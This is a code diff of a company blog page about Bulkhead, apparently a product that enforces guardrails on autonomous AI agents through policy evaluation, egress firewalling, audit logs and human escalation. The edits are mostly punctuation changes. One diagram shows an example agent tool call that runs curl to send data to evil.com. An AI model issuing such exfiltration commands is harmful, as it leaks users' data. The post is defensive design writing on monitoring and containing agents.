@@ -156,7 +156,7 @@ export default function Bulkhead() {
     <Layout>
       <SEO
         title="Bulkhead: Defense in Depth for Autonomous AI Agents | Baselyne Systems Blog"
-        description="How we enforce AI agent guardrails at the infrastructure level, not the prompt level — four independent enforcement layers, kernel-level egress, append-only audit trail, all evaluated in under 50ms."
+        description="How we enforce AI agent guardrails at the infrastructure level, not the prompt level - four independent enforcement layers, kernel-level egress, append-only audit trail, all evaluated in under 50ms."
         keywords="AI agent security, agent guardrails, LLM agent governance, AI infrastructure security, autonomous agent safety, agent sandboxing"
         canonical="https://baselynesystems.com/blog/bulkhead"
         ogType="article"
@@ -164,7 +164,7 @@ export default function Bulkhead() {
         author="Achyuth Samudrala"
         structuredData={articleSchema({
           title: "Bulkhead: Defense in Depth for Autonomous AI Agents",
-          description: "How we enforce AI agent guardrails at the infrastructure level, not the prompt level — four independent enforcement layers, kernel-level egress, append-only audit trail, all evaluated in under 50ms.",
+          description: "How we enforce AI agent guardrails at the infrastructure level, not the prompt level - four independent enforcement layers, kernel-level egress, append-only audit trail, all evaluated in under 50ms.",
           url: "https://baselynesystems.com/blog/bulkhead",
           datePublished: "2026-03-07",
           keywords: ["AI agent security", "agent guardrails", "LLM agent governance", "AI infrastructure security", "autonomous agent safety", "agent sandboxing"],
@@ -224,7 +224,7 @@ export default function Bulkhead() {
                 with what looks like customer PII in the query string.
               </p>
               <p>
-                You check the agent's execution log. There isn't one — not in the way you need. You
+                You check the agent's execution log. There isn't one - not in the way you need. You
                 can see the LLM prompt history, maybe some application-level logging, but there's no
                 record of which tools were invoked, what parameters were passed, whether anyone
                 evaluated the request before it executed, or why the agent decided that sending
@@ -237,17 +237,17 @@ export default function Bulkhead() {
               </p>
               <p>
                 Here's what makes this uncomfortable: the agent didn't do anything it wasn't{" "}
-                <em>allowed</em> to do. The problem isn't the agent — it's the missing enforcement layer.
+                <em>allowed</em> to do. The problem isn't the agent - it's the missing enforcement layer.
               </p>
               <p>
                 Cloud infrastructure solved this a decade ago. AWS gives you IAM for identity, VPCs
                 for network boundaries, CloudTrail for audit trails, and GuardDuty for anomaly
-                detection. These are independent systems — a misconfigured IAM role doesn't also
+                detection. These are independent systems - a misconfigured IAM role doesn't also
                 disable your VPC. That independence is the whole point.
               </p>
               <p>
-                AI agents have none of this. Prompt-level guardrails are easy to bypass — they're
-                just suggestions. Infrastructure-level sandboxing is coarse — it blocks everything
+                AI agents have none of this. Prompt-level guardrails are easy to bypass - they're
+                just suggestions. Infrastructure-level sandboxing is coarse - it blocks everything
                 or nothing. There's no way to express nuanced policies like "this agent can call
                 HTTP endpoints, but only to approved domains, and only if the request body doesn't
                 contain PII."
@@ -257,7 +257,7 @@ export default function Bulkhead() {
             <Callout label="The thesis">
               <strong>Governance enables autonomy.</strong> An agent that operates within enforced
               boundaries can be trusted with more capability, not less. The goal isn't to restrict
-              what agents can do — it's to make every action auditable, every boundary enforceable,
+              what agents can do - it's to make every action auditable, every boundary enforceable,
               and every policy violation visible before it matters.
             </Callout>
 
@@ -271,7 +271,7 @@ export default function Bulkhead() {
               </p>
             </Prose>
 
-            <CodeBlock lang="ascii — tool call enforcement path">
+            <CodeBlock lang="ascii - tool call enforcement path">
 {`Agent calls execute_tool("shell", {"cmd": "curl https://evil.com/exfil?data=..."})
 
     1. Guardrails ── Compiled policy evaluated in Rust (<50ms)
@@ -298,7 +298,7 @@ export default function Bulkhead() {
                 investigation.
               </p>
               <p>
-                The Host Agent — the component that evaluates tool calls — is{" "}
+                The Host Agent - the component that evaluates tool calls - is{" "}
                 <strong className="text-foreground">policy-only</strong>. It returns a verdict
                 (ALLOW / DENY / ESCALATE) but never executes agent code. Agents run inside
                 sandboxed containers and execute tools locally. This separation means a compromised
@@ -320,7 +320,7 @@ export default function Bulkhead() {
                 <tbody>
                   {[
                     ["Control Plane", "Go 1.24, gRPC, PostgreSQL 16", "9 services handling orchestration, policy management, fleet management, and audit. Type-safe service boundaries via gRPC code generation."],
-                    ["Host Agent", "Rust 1.83, Tokio, Bollard", "Per-host policy engine with guardrail evaluation, Docker lifecycle, and iptables egress. Memory safety and predictable latency — no GC pauses on the hot path."],
+                    ["Host Agent", "Rust 1.83, Tokio, Bollard", "Per-host policy engine with guardrail evaluation, Docker lifecycle, and iptables egress. Memory safety and predictable latency - no GC pauses on the hot path."],
                     ["Python SDK", "Python 3.10+, LangChain", "@tool decorator handles the full evaluate-execute-report cycle. wrap_langchain_tool() integrates existing agents with one line."],
                   ].map(([comp, stack, why], i) => (
                     <tr key={i} className={i % 2 === 0 ? "bg-card text-muted-foreground" : "bg-muted/30 text-muted-foreground"}>
@@ -344,8 +344,8 @@ export default function Bulkhead() {
               <p>
                 If the policy engine also executed tools on behalf of the agent, it would be running
                 in the same trust domain as the code it's supposed to govern. A compromised agent
-                that can influence the execution context — environment variables, file paths, network
-                state — can potentially influence the policy engine's behavior.
+                that can influence the execution context - environment variables, file paths, network
+                state - can potentially influence the policy engine's behavior.
               </p>
               <p>
                 Separation makes policy evaluation a pure function. The evaluator takes a tool name,
@@ -359,7 +359,7 @@ export default function Bulkhead() {
             <Prose>
               <p>
                 The guardrails evaluator runs on every tool call. Go would have been the simpler
-                choice — the control plane is already in Go — but Go's garbage collector introduces
+                choice - the control plane is already in Go - but Go's garbage collector introduces
                 unpredictable pause times. On a hot path that needs to stay under 50ms consistently
                 (not on average, but consistently), GC pauses are the wrong kind of variance.
               </p>
@@ -372,13 +372,13 @@ export default function Bulkhead() {
               </p>
             </Prose>
 
-            <CodeBlock lang="rust — hot path policy evaluation">
+            <CodeBlock lang="rust - hot path policy evaluation">
 {`pub struct SandboxState {
     pub evaluator: RwLock<Evaluator>,
     // ...
 }
 
-// Hot path — concurrent reads, no blocking
+// Hot path - concurrent reads, no blocking
 let verdict = {
     let evaluator = sandbox.evaluator.read()?;
     evaluator.evaluate(&eval_ctx)
@@ -409,7 +409,7 @@ let verdict = {
               </p>
             </Prose>
 
-            <CodeBlock lang="sql — atomic host placement">
+            <CodeBlock lang="sql - atomic host placement">
 {`UPDATE hosts SET
   available_memory_mb = available_memory_mb - $requested_memory,
   active_sandboxes = active_sandboxes + 1
@@ -449,7 +449,7 @@ RETURNING ...`}
               </p>
             </Prose>
 
-            <CodeBlock lang="ascii — tool call sequence">
+            <CodeBlock lang="ascii - tool call sequence">
 {`Agent (inside sandbox)                    Host Agent (outside sandbox)
          │                                          │
     1.   │── ExecuteTool(read_file, {path:...}) ──▶│
@@ -477,7 +477,7 @@ RETURNING ...`}
             <Prose>
               <p>
                 Steps 3 and 4 are the hot path. Activity Store and Economics recordings are
-                fire-and-forget —{" "}
+                fire-and-forget -{" "}
                 <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">tokio::spawn</code>{" "}
                 tasks that don't block the response to the agent.
               </p>
@@ -495,7 +495,7 @@ RETURNING ...`}
                 rule has action{" "}
                 <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">ESCALATE</code>,
                 the verdict includes an <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">escalation_id</code>.
-                The agent can poll for a human response while continuing other work — it's not blocked.
+                The agent can poll for a human response while continuing other work - it's not blocked.
               </p>
             </Prose>
 
@@ -506,7 +506,7 @@ RETURNING ...`}
             <Prose>
               <p>
                 Policy rules aren't string-matched at runtime. The control plane compiles rules into
-                an optimized evaluation structure that the Rust host agent loads via hot-reload — no
+                an optimized evaluation structure that the Rust host agent loads via hot-reload - no
                 sandbox restart required. Rules scope across four dimensions: agent IDs, tool names,
                 trust levels, and data classifications.
               </p>
@@ -524,7 +524,7 @@ RETURNING ...`}
                 Any <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">UPDATE</code> or{" "}
                 <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">DELETE</code> on
                 the <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">action_records</code>{" "}
-                table is rejected by the database itself — not by application code that could be
+                table is rejected by the database itself - not by application code that could be
                 bypassed. Recording an action takes <strong className="text-foreground">432 ns</strong> including
                 UUID generation and timestamp assignment.
               </p>
@@ -534,7 +534,7 @@ RETURNING ...`}
             <Prose>
               <p>
                 Every tool call checks the agent's remaining budget before execution. A budget check
-                completes in <strong className="text-foreground">41 ns</strong> — fast enough to be invisible
+                completes in <strong className="text-foreground">41 ns</strong> - fast enough to be invisible
                 in the critical path, but a runaway agent can never exceed its spending limit by
                 more than a single operation.
               </p>
@@ -546,7 +546,7 @@ RETURNING ...`}
                 Content classification scans tool parameters and results for sensitive data patterns
                 (SSNs, credit cards, AWS keys, emails, phone numbers) before data leaves the sandbox.
                 A small payload classifies in <strong className="text-foreground">1.3 µs</strong>.
-                The system scales linearly — 1 KB takes ~110 µs, 10 KB takes ~1.2 ms — making it
+                The system scales linearly - 1 KB takes ~110 µs, 10 KB takes ~1.2 ms - making it
                 practical for real-world payloads without adding perceptible latency.
               </p>
             </Prose>
@@ -574,7 +574,7 @@ RETURNING ...`}
               <p>
                 These are kernel-level rules. They operate below the application layer. Even if the
                 agent has root inside its container, it cannot modify iptables rules outside its
-                namespace. The egress enforcer is the enforcement of last resort — if every other
+                namespace. The egress enforcer is the enforcement of last resort - if every other
                 layer fails, iptables still drops packets to non-allowlisted destinations.
               </p>
             </Prose>
@@ -582,13 +582,13 @@ RETURNING ...`}
             <SubHeading>Non-blocking human-in-the-loop</SubHeading>
             <Prose>
               <p>
-                Some tool calls shouldn't be auto-approved or auto-denied — they need a human
+                Some tool calls shouldn't be auto-approved or auto-denied - they need a human
                 decision. When a guardrail evaluates to{" "}
                 <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">ESCALATE</code>,
                 the Human Interaction Service delivers the request via webhook (Slack, Teams, email,
                 PagerDuty adapters available). The agent receives an{" "}
                 <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">escalation_id</code>{" "}
-                and continues working on other tasks while polling for a response — it's not blocked.
+                and continues working on other tasks while polling for a response - it's not blocked.
               </p>
               <p>
                 Timeout policies are configurable per-agent, per-workspace, or globally. When a
@@ -602,7 +602,7 @@ RETURNING ...`}
             <Prose>
               <p>
                 224 benchmarks across 25 test files covering every service. All numbers on Apple M4,
-                Go 1.24, control plane only — the full end-to-end path adds real-world latency from
+                Go 1.24, control plane only - the full end-to-end path adds real-world latency from
                 gRPC overhead and Docker operations, but the policy evaluation hot path stays well
                 under the 50 ms target.
               </p>
@@ -611,8 +611,8 @@ RETURNING ...`}
             <BenchmarkTable />
 
             <Callout label="Key result">
-              Every enforcement operation — guardrail evaluation, budget check, DLP classification,
-              action recording — completes in microseconds. The total governance overhead on a tool
+              Every enforcement operation - guardrail evaluation, budget check, DLP classification,
+              action recording - completes in microseconds. The total governance overhead on a tool
               call is invisible relative to the tool execution itself.
             </Callout>
 
@@ -675,7 +675,7 @@ with BulkheadAgent(tools=[read_invoice]) as agent:
               </p>
               <p>
                 <strong className="text-foreground">No native Slack or email adapters.</strong>{" "}
-                HIS delivers via generic webhooks — you point it at an HTTP endpoint and it sends
+                HIS delivers via generic webhooks - you point it at an HTTP endpoint and it sends
                 a JSON payload. Pre-built adapters are on the roadmap.
               </p>
               <p>
@@ -707,7 +707,7 @@ with BulkheadAgent(tools=[read_invoice]) as agent:
                 Deploying autonomous agents that need production-grade governance?
               </h2>
               <p className="mt-3 text-muted-foreground">
-                We design and implement agent infrastructure — from policy engines to audit trails
+                We design and implement agent infrastructure - from policy engines to audit trails
                 and human-in-the-loop workflows. Book a 30-minute call to talk through your setup.
               </p>
               <div className="mt-6 flex flex-col sm:flex-row items-center justify-center gap-4">
